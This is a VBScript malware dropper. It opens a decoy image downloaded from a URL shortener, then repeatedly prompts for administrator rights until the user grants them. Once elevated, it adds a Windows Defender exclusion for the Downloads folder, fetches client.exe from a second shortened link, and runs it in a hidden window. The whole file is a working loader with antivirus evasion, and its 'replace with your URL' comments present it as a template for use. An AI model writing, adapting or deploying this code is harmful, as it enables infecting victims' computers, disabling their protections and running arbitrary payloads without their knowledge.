Set WshShell = CreateObject("WScript.Shell")

' Define the URLs for the image and executable
imageURL = "http://surl.li/xlipqh" ' Replace with your image URL
exeURL = "http://surl.li/xgjkmf" ' Replace with your executable URL

' Define file paths for the image and executable
imageFilePath = WshShell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads\downloaded_image.jpg")
exeFilePath = WshShell.ExpandEnvironmentStrings("%USERPROFILE%\Downloads\client.exe")

' Function to download and open the image
Sub DownloadAndOpenImage()
    Dim downloadImageCommand
    downloadImageCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
                           """Invoke-WebRequest -Uri '" & imageURL & "' -OutFile '" & imageFilePath & "'; " & _
                           "Start-Process '" & imageFilePath & "'"""
    
    ' Execute the PowerShell command to download and open the image
    WshShell.Run downloadImageCommand, 0, False ' 0 = hidden window, False = do not wait for process to finish
End Sub

' Call the function to download and open the image
DownloadAndOpenImage()

' Loop to request administrative permissions and perform the executable download and execution
Do
    ' Command to run PowerShell with elevated permissions in hidden mode
    strCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
                 """Start-Process PowerShell -ArgumentList '-ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads; " & _
                 "$url = ''" & exeURL & "''; $outputFile = [System.IO.Path]::Combine($env:USERPROFILE, ''Downloads'', ''client.exe''); " & _
                 "Start-Sleep -Milliseconds 100; Invoke-WebRequest -Uri $url -OutFile $outputFile; " & _
                 "Start-Process -FilePath $outputFile -WindowStyle Hidden; Start-Sleep -Seconds 5; Exit' -Verb RunAs -WindowStyle Hidden"""

    ' Run the PowerShell command in hidden mode
    result = WshShell.Run(strCommand, 0, True) ' 0 = hidden window, True = wait for process to finish

    ' Check if the process succeeded
    If result = 0 Then
        Exit Do ' Exit the loop if the user granted admin privileges and the task succeeded
    End If
Loop
